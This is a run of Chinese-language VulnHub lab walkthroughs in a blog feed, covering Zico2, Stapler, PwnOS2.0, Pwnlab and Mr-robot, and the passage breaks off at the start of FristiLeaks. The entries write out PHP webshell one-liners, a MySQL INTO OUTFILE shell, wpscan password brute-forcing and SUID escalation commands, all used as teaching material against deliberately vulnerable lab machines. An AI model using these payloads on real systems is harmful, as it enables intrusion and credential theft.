  <entry>
    <title>vulnhub_Zico2</title>
    <link href="/2023/04/26/vulnhub-Zico2/"/>
    <url>/2023/04/26/vulnhub-Zico2/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-vulnhub-Zico2"><a href="#vulnhub-vulnhub-Zico2" class="headerlink" title="vulnhub_vulnhub_Zico2"></a>vulnhub_vulnhub_Zico2</h1><p>arp-scan+masscan扫端口：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309085304660.png" alt="image-20230309085304660"></p><p>nmap扫服务：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309085425386.png" alt="image-20230309085425386"></p><p>开放了22，80，111，50670等端口。</p><p>尝试ssh弱口令，失败：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309091310662.png" alt="image-20230309091310662"></p><p>访问80端口的http服务：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309091518406.png" alt="image-20230309091518406"></p><p>点击各类功能点，发现如下页面，page&#x3D;xxx:</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309091602675.png" alt="image-20230309091602675"></p><p>尝试本地文件包含，存在漏洞：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309091624462.png" alt="image-20230309091624462"></p><p>dirsearch爆破后台目录：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309091822847.png" alt="image-20230309091822847"></p><p>发现&#x2F;dbadmin，访问路径：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309091837154.png" alt="image-20230309091837154"></p><p>发现phpliteadmin，尝试弱口令admin：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309095117322.png" alt="image-20230309095117322"></p><p>登录成功：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309095224609.png" alt="image-20230309095224609"></p><p>首先想到查询数据，选择csv格式导出：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309095355218.png" alt="image-20230309095355218"></p><p>发现root和zico两个用户。</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309095433457.png" alt="image-20230309095433457"></p><p>md5解密：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309095517231.png" alt="image-20230309095517231"></p><p>直接ssh登录root&#x2F;34root34，失败。</p><p>尝试寻找phpliteadmin漏洞，使用searchsploit搜索：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309095627928.png" alt="image-20230309095627928"></p><p>存在代码注入漏洞，根据提示，需要新建数据库，新建表，就能执行php代码。</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309095639243.png" alt="image-20230309095639243"></p><p>创建表，插入一条数据<code>&lt;?php @eval($_POST[cmd]); ?&gt;</code></p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309100008129.png" alt="image-20230309100008129"></p><p>成功写入，再配合前面的本地文件包含，直接getshell，连上蚁剑。</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309100225528.png" alt="image-20230309100225528"></p><p>在home下，查找zico相关文件，发现wp配置，存在用户名密码。</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309100615572.png" alt="image-20230309100615572"></p><p>弹shell到kali，生成交互shell，su zico，切换到zico用户：</p><p><img src="/2023/04/26/vulnhub-Zico2/image-20230309100803138.png" alt="image-20230309100803138"></p><p>sudo -l，发现tar，zip，直接提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Stapler</title>
    <link href="/2023/04/26/vulnhub-Stapler/"/>
    <url>/2023/04/26/vulnhub-Stapler/</url>
    
    <content type="html"><![CDATA[<h1 id="Stapler"><a href="#Stapler" class="headerlink" title="Stapler"></a>Stapler</h1><p>arp-scan发现目标主机：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230307232914512.png" alt="image-20230307232914512"></p><p>masscan全端口扫描：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230307232942455.png" alt="image-20230307232942455"></p><p>nmap详细扫描：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230307233921356.png" alt="image-20230307233921356"></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230307233945813.png" alt="image-20230307233945813"></p><p>开放了ftp,ssh,mysql,smb,http等服务。</p><p>ftp允许匿名登录：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230307234331021.png" alt="image-20230307234331021"></p><p>查看note文件内容:</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230307234345835.png" alt="image-20230307234345835"></p><p>这里提到一些用户名：Harry,Jojn,Elly.</p><p>ssh连接：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308151213643.png" alt="image-20230308151213643"></p><p>新的用户名Barry。</p><p>尝试弱口令失败，暂时跳过。</p><p>enum4linux可以发现一些用户信息：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308171948892.png" alt="image-20230308171948892"></p><p>对于smb协议，查看共享文件夹：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308171639530.png" alt="image-20230308171639530"></p><p>可以访问kathy和tmp目录，均无有效信息：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308171722902.png" alt="image-20230308171722902"></p><p>666端口服务为止，直接nc：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308151340275.png" alt="image-20230308151340275"></p><p>可以看到message2.jpg。</p><p>接收文件并保存：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308151442195.png" alt="image-20230308151442195"></p><p>发现为zip文件，改名解压：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308151514679.png" alt="image-20230308151514679"></p><p>新用户名Scott.</p><p>收集到以上用户名之后尝试进行ssh和ftp服务的爆破。</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308160218674.png" alt="image-20230308160218674"></p><p>ssh爆破失败，但是ftp爆破出elly&#x2F;ylle，登录后并无有用信息。</p><p>接下来把重点放在80和12380端口的http服务。</p><p>先看80：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308085447584.png" alt="image-20230308085447584"></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308085437715.png" alt="image-20230308085437715"></p><p>这里有两个配置文件，.bashrc和.profile，先下载到本地。</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308085713209.png" alt="image-20230308085713209"></p><p>无有用信息。</p><p>接下来尝试访问12380：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308091700598.png" alt="image-20230308091700598"></p><p>无任何有效信息，访问robots.txt等目录，不发生跳转，返回400：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308091802471.png" alt="image-20230308091802471"></p><p>nikto扫描：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308091905800.png" alt="image-20230308091905800"></p><p>这里提到了&#x2F;admin112233,&#x2F;blogblog等目录，但是http访问后依然为400，nikto显示有ssl信息，使用https:</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308092714929.png" alt="image-20230308092714929"></p><p>出现不同的页面。</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308092737735.png" alt="image-20230308092737735"></p><p>admin112233为xss页面。</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308092803364.png" alt="image-20230308092803364"></p><p>blogblog为博客页面。对该目录进行爆破：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308093300771.png" alt="image-20230308093300771"></p><p>明显为wordpress框架。</p><p>上wpscan：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308093434748.png" alt="image-20230308093434748"></p><p>提示SSL peer certificate or SSH remote key was not OK,可能是ssl证书有问题，disable：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks</code></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308093703854.png" alt="image-20230308093703854"></p><p>问题解决。</p><p>扫一下用户名：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate u</code></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308160754290.png" alt="image-20230308160754290"></p><p>枚举出用户名后，直接大字典爆破密码：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks -eu -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308161305127.png" alt="image-20230308161305127"></p><p>用得到的账号登录：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308161505638.png" alt="image-20230308161505638"></p><p>普通用户权限，非管理员，暂时跳过。</p><p>回到wpscan，对wordpress插件进行扫描，尝试利用插件漏洞，默认为被动扫描，要发现全部插件这里使用主动扫描，ap代表all plugins：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate ap --plugins-detection aggressive</code></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308161957394.png" alt="image-20230308161957394"></p><p>扫出了图中部分插件。经过尝试，advanced-video-embed-embed-videos-or-playlists存在漏洞。</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308162206276.png" alt="image-20230308162206276"></p><p>在EDB中寻找poc，查看python文件：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308162257243.png" alt="image-20230308162257243"></p><p>这里修改url为靶机的地址，运行报错：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308162346333.png" alt="image-20230308162346333"></p><p>修改poc，导入ssl，并且加上<code>ssl._create_default_https_context = ssl._create_unverified_context</code></p><p>再次运行，无回显。</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308162534743.png" alt="image-20230308162534743"></p><p>此时查看登录后的主页，发现出现了.jpg：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308163901154.png" alt="image-20230308163901154"></p><p>尝试直接访问poc中的url：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308163949595.png" alt="image-20230308163949595"></p><p>访问提示页面后出现404。</p><p>尝试访问jpeg文件，wordpress中一般存在&#x2F;wp-content&#x2F;uploads文件夹，访问后发现jpeg文件。</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308164229282.png" alt="image-20230308164229282"></p><p>直接wget下载文件：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308164423023.png" alt="image-20230308164423023"></p><p>ssl证书有问题，加上参数–no-check-certificate后解决。</p><p>查看文件内容：<br><img src="/2023/04/26/vulnhub-Stapler/image-20230308164459634.png" alt="image-20230308164459634"></p><p>jpeg文件内容为config文件，包含了数据库配置信息。</p><p>直接登录数据库，找到用户表：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308164621458.png" alt="image-20230308164621458"></p><p>注意John用户存在user_url，可能为管理员权限。</p><p>将用户名密码简单处理后如下：<br><img src="/2023/04/26/vulnhub-Stapler/image-20230308164722763.png" alt="image-20230308164722763"></p><p>用john跑密码：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308165310180.png" alt="image-20230308165310180"></p><p>用John&#x2F;incorrect登录后台：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308165344905.png" alt="image-20230308165344905"></p><p>成功获得管理员权限。</p><p>尝试寻找上传点传马或者改服务端文件，在插件处发现可以上传文件：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308165444017.png" alt="image-20230308165444017"></p><p>直接上传，到uploads目录查看，上传成功：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308165511905.png" alt="image-20230308165511905"></p><p>这里如果没找到上传点，可以直接用mysql写马：</p><p><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;/var/www/https/blogblog/wp-content/uploads/cmd1.php</code></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308174104145.png" alt="image-20230308174104145"></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308174122155.png" alt="image-20230308174122155"></p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308174138286.png" alt="image-20230308174138286"></p><p>连蚁剑，注意需要忽略https证书，不然会连接失败：</p><img src="/2023/04/26/vulnhub-Stapler/image-20230308165627564.png" alt="image-20230308165627564" style="zoom:50%;"><p>成功连接：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308165610387.png" alt="image-20230308165610387"></p><p>弹shell到kali，pty：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308170259336.png" alt="image-20230308170259336"></p><p>home目录下存在很多文件夹，内容都为空。</p><p>查看一下history文件，由于存在很多exit命令，使用grep排除：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308170545936.png" alt="image-20230308170545936"></p><p>发现peter和JKanode用户的密码。</p><p>JKanode：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308170814399.png" alt="image-20230308170814399"></p><p>peter：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308170939917.png" alt="image-20230308170939917"></p><p>直接sudo提权，可以执行任意命令，拿到flag。</p><p>同时拿到www低权限之后，可以使用CVE-2021-4034提权，几乎通杀：</p><p><img src="/2023/04/26/vulnhub-Stapler/image-20230308171520442.png" alt="image-20230308171520442"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_PwnOS2.0</title>
    <link href="/2023/04/26/vulnhub-PwnOS2-0/"/>
    <url>/2023/04/26/vulnhub-PwnOS2-0/</url>
    
    <content type="html"><![CDATA[<h1 id="PwnOS2-0"><a href="#PwnOS2-0" class="headerlink" title="PwnOS2.0"></a>PwnOS2.0</h1><p>首先nmap扫描端口，发现22，25，80，110等开放：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321135938360.png" alt="image-20230321135938360"></p><p>nikto扫一下80的http服务：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321140053612.png" alt="image-20230321140053612"></p><p>发现了一些敏感目录。</p><p>info目录为phpinfo:</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321140123549.png" alt="image-20230321140123549"></p><p>includes:</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321140140442.png" alt="image-20230321140140442"></p><p>login.php为登录页面：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321140320230.png" alt="image-20230321140320230"></p><p>register.php为注册页面：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321140330516.png" alt="image-20230321140330516"></p><p>注册用户<a href="mailto:&#97;&#97;&#97;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#x6d;">&#97;&#97;&#97;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#x6d;</a>，未发现有用信息。</p><p>接下来考虑通过login.php来getshell，在email字段输入单引号，报错：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321140613604.png" alt="image-20230321140613604"></p><p>明显存在sql注入，并且报错提示数据库为mysql。</p><p>burp抓包直接跑sqlmap，加上–dbms mysql参数：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321140853513.png" alt="image-20230321140853513"></p><p>存在注入，–dump，查看user&#x2F;pass：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321141528736.png" alt="image-20230321141528736"></p><p><a href="mailto:&#97;&#97;&#x61;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;">&#97;&#97;&#x61;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;</a>是注册的测试账号，尝试使用<a href="mailto:&#x61;&#100;&#x6d;&#105;&#110;&#x40;&#105;&#x73;&#105;&#110;&#x74;&#x73;&#46;&#99;&#111;&#109;">&#x61;&#100;&#x6d;&#105;&#110;&#x40;&#105;&#x73;&#105;&#110;&#x74;&#x73;&#46;&#99;&#111;&#109;</a>账号登录&#x2F;</p><p>密码为md5，解开后为killerbeesareflying，登录：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321141719166.png" alt="image-20230321141719166"></p><p>登录成功，但是没有可用信息，回到sqlmap，直接–os-shell:</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321141951074.png" alt="image-20230321141951074"></p><p>成功拿到shell，为www-data权限，但是此处的shell无法弹到kali。</p><p>在kali上寻找php马，传到靶机上：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321142452841.png" alt="image-20230321142452841"></p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321142229760.png" alt="image-20230321142229760"></p><p>本地开启监听，成功连上靶机：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321142252180.png" alt="image-20230321142252180"></p><p>在当前目录下发现mysqli_connect.php文件，并发现密码root&#x2F;goodday:</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321142626934.png" alt="image-20230321142626934"></p><p>尝试登录mysql，失败，登录ssh同样失败。</p><p>回到上级目录，也存在mysqli_connect.php文件，查看发现另一组账号root&#x2F;root@ISIntS:</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321142650060.png" alt="image-20230321142650060"></p><p>ssh登录，成功拿到root权限：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321142837619.png" alt="image-20230321142837619"></p><p>同时该密码可以登录mysql，因此尝试udf提权。</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321155456474.png" alt="image-20230321155456474"></p><p>首先查看secure_file_priv，如果值为空，则可以提权：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321155715082.png" alt="image-20230321155715082"></p><p>接下来查看compile选项：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321155755619.png" alt="image-20230321155755619"></p><p>linux，64位。</p><p>最后查看plugin路径，如果没有需要自行创建，此处存在：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321155836405.png" alt="image-20230321155836405"></p><p>使用sqlmap直接将udf.so文件传到plugin目录：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321143053212.png" alt="image-20230321143053212"></p><p>此处的so文件使用的是msf自带的，如果使用sqlmap中的，需要先进行解码。</p><p>msf中路径为：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321160832973.png" alt="image-20230321160832973"></p><p>分别对应了linux和windows中的32&#x2F;64位文件，此处使用的是lib_mysqludf_sys_64.so。</p><p>上传之后，默认会多出一个sys_eval方法，但是不会回显，再手动添加一次，returns string：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321153548843.png" alt="image-20230321153548843"></p><p>此时查询方法，存在sys_eval，执行whoami，是root权限，提权成功。</p><p>为了后续操作，给find加上suid：</p><p><img src="/2023/04/26/vulnhub-PwnOS2-0/image-20230321143316978.png" alt="image-20230321143316978"></p><p>从www-data权限，使用suid提权，<code>touch 1.txt, find 1.txt -exec &#39;/bin/sh&#39; \;</code>，成功提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Pwnlab</title>
    <link href="/2023/04/26/vulnhub-Pwnlab/"/>
    <url>/2023/04/26/vulnhub-Pwnlab/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwnlab"><a href="#Pwnlab" class="headerlink" title="Pwnlab"></a>Pwnlab</h1><p>nmap扫端口&amp;服务：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323110917405.png" alt="image-20230323110917405"></p><p>主要是rpc和80端口的http服务。</p><p>使用rpcinfo进行探测：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323111530034.png" alt="image-20230323111530034"></p><p>无有效信息。</p><p>dirsearch爆破后台敏感目录：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323111545504.png" alt="image-20230323111545504"></p><p>首先直接访问80端口：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323134559022.png" alt="image-20230323134559022"></p><p>访问&#x2F;upload:</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323134621886.png" alt="image-20230323134621886"></p><p>很明显为上传的文件。</p><p>接着访问&#x2F;upload.php:</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323134633666.png" alt="image-20230323134633666"></p><p>提示需要登录。</p><p>接下来访问login页面，出现登录框：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323134652498.png" alt="image-20230323134652498"></p><p>burp抓包：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323135618265.png" alt="image-20230323135618265"></p><p>输入单引号，无变化，保存报文内容跑sqlmap，无果。</p><p>对&#x2F;login.php进行同样的尝试：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323135734466.png" alt="image-20230323135734466"></p><p>同样失败。</p><p>尝试对upload发送options请求：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323135830977.png" alt="image-20230323135830977"></p><p>不允许put方法，无法直接写马。</p><p>仔细观察流量，发现登录页面的url为&#x2F;?page&#x3D;login，考虑存在文件包含漏洞。</p><p>直接尝试&#x2F;etc&#x2F;passwd：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323140414126.png" alt="image-20230323140414126"></p><p>无回显。</p><p>尝试伪协议读取源码。目前url为<a href="http://192.168.59.30/index.php?page=login%EF%BC%8C%E8%80%8Cconfig.php%E4%B8%BAhttp://192.168.59.30/config.php%EF%BC%8C%E5%9B%A0%E6%AD%A4%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%EF%BC%9A">http://192.168.59.30/index.php?page=login，而config.php为http://192.168.59.30/config.php，因此需要返回一级目录：</a></p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323140649744.png" alt="image-20230323140649744"></p><p>成功读取，base64解密：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323140713926.png" alt="image-20230323140713926"></p><p>得到数据库的账号密码，连接数据库：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323141140279.png" alt="image-20230323141140279"></p><p>base64解密后，得到kent，mike和kane3个用户的密码。ssh连接失败，端口未开放：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323141906558.png" alt="image-20230323141906558"></p><p>无法直接ssh，因此登录尝试文件上传：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323142523888.png" alt="image-20230323142523888"></p><p>上传php马，提示不允许的后缀，只能上传图片。</p><p>首先考虑apache多后缀解析漏洞，上传pwnlab.php.jpg:</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323144220196.png" alt="image-20230323144220196"></p><p>未绕过。</p><p>接下来考虑上传图片马，再配合解析漏洞或者文件包含漏洞将其作为php文件解析。</p><p>&#x2F;index.php?page&#x3D;xxx该处存在文件包含漏洞，读取index.php源码：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323144332964.png" alt="image-20230323144332964"></p><p>base64 decode：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323144356432.png" alt="image-20230323144356432"></p><p>这里如果cookie中lang参数又存在文件包含。</p><p>先制作图片马，echo -e代表允许反斜杠解析，GIF89a为gif文件的文件头：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323144857630.png" alt="image-20230323144857630"></p><p>上传成功：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323145006507.png" alt="image-20230323145006507"></p><p>在cookie中输入gif文件的url，将php马包含，kali开启监听：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323145136383.png" alt="image-20230323145136383"></p><p>成功获取shell。</p><p>当前为www-data权限，通过前面获取的账号密码，可以登录到kent和kane账户。</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323145609941.png" alt="image-20230323145609941"></p><p>kent目录下无文件，切换到kane，发现msgmike。</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323150733143.png" alt="image-20230323150733143"></p><p>msgmike为elf可执行文件，并且有suid，strings查看发现存在命令cat &#x2F;home&#x2F;mike&#x2F;msg.txt。</p><p>直接运行：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323150837248.png" alt="image-20230323150837248"></p><p>提示无cat文件。因此直接新建cat文件，内容为&#x2F;bin&#x2F;bash，并且将$PATH参数修改，默认先使用我们新建的cat：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323151050920.png" alt="image-20230323151050920"></p><p>成功提权到mike，此时记得将$PATH恢复。</p><p>进入&#x2F;home&#x2F;mike目录下，存在msg2root文件，通过命名判断，需要通过该文件从mike提权到root权限。</p><p>将msg2root放入ida：</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323152452183.png" alt="image-20230323152452183"></p><p>发现system函数。</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323152547004.png" alt="image-20230323152547004"></p><p>并且msg2root为root权限，因此考虑直接使用msg2root执行&#x2F;bin&#x2F;bash命令拿到root shell。</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323152844893.png" alt="image-20230323152844893"></p><p>这里类似于远程代码执行漏洞，通过；截断即可执行命令，&#x2F;bin&#x2F;bash失败，尝试&#x2F;bin&#x2F;sh:</p><p><img src="/2023/04/26/vulnhub-Pwnlab/image-20230323152925140.png" alt="image-20230323152925140"></p><p>成功。经过尝试&amp;等符号同样可行。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Mr-robot</title>
    <link href="/2023/04/26/vulnhub-Mr-robot/"/>
    <url>/2023/04/26/vulnhub-Mr-robot/</url>
    
    <content type="html"><![CDATA[<h1 id="Mr-robot"><a href="#Mr-robot" class="headerlink" title="Mr-robot"></a>Mr-robot</h1><p>nmap扫描，开放了80和443端口：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322143637974.png" alt="image-20230322143637974"></p><p>浏览器访问：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322143728895.png" alt="image-20230322143728895"></p><p>后台目录爆破：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322145023429.png" alt="image-20230322145023429"></p><p>发现robots.txt，访问：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322145306410.png" alt="image-20230322145306410"></p><p>发现两个文件,fsocity.dic，key-1-of-3.txt，分别查看：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322145336763.png" alt="image-20230322145336763"></p><p>其中fsocity.dic是一个字典，有80万行，接着访问key：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322145351085.png" alt="image-20230322145351085"></p><p>看似为md5值，md5解密失败，从名称判断应该是3个key中的第一个。</p><p>dirsearch还发现了wp-login等目录，判断该网站为word press。</p><p>结合dic字典，进行账号爆破。首先对字典进行去重：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322145213115.png" alt="image-20230322145213115"></p><p>去重后保存到new文件，有1万多行数据。</p><p>首先从lostpassword页面爆破用户名：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322150401225.png" alt="image-20230322150401225"></p><p>对结果进行关键字匹配，成功爆破出Elliot。</p><p>使用该用户名，继续爆破密码：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322150604710.png" alt="image-20230322150604710"></p><p>爆破出密码ER28-0652。</p><p>登录后台：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322150644787.png" alt="image-20230322150644787"></p><p>在appearance模块中可以编辑php文件，最简单的方法是修改404.php，将马复制到404.php，任意输入不存在的url，报错，连接成功：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322151001633.png" alt="image-20230322151001633"></p><p>此时为daemon权限。</p><p>进入home，发现存在robot目录，发现password.raw-md5，解密后得到robot用户的密码，并且成功得到第二个key。</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322151015498.png" alt="image-20230322151015498"></p><p>接下来继续提权到root，sudo -l无可用命令，上传检查脚本：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322151033460.png" alt="image-20230322151033460"></p><p>发现nmap有suid：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322151207435.png" alt="image-20230322151207435"></p><p>nmap –interactive进入交互模式，起shell：</p><p><img src="/2023/04/26/vulnhub-Mr-robot/image-20230322151416138.png" alt="image-20230322151416138"></p><p>成功拿到root权限，得到第三个key。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_FristiLeaks_1.3</title>
    <link href="/2023/04/26/vulnhub-FristiLeaks-1-3/"/>
    <url>/2023/04/26/vulnhub-FristiLeaks-1-3/</url>
    
    <content type="html"><![CDATA[<h1 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks_1.3"></a>FristiLeaks_1.3</h1><p>arp-scan获取目标ip 192.168.59.18：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307205944349.png" alt="image-20230307205944349"></p><p>masscan全端口扫描:</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307212119043.png" alt="image-20230307212119043"></p><p>nmap对开放端口进行服务探测：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307212152487.png" alt="image-20230307212152487"></p><p>whatweb：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307212239788.png" alt="image-20230307212239788"></p><p>dirsearch目录爆破：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307212417837.png" alt="image-20230307212417837"></p><p>nikto扫描：</p><p><img 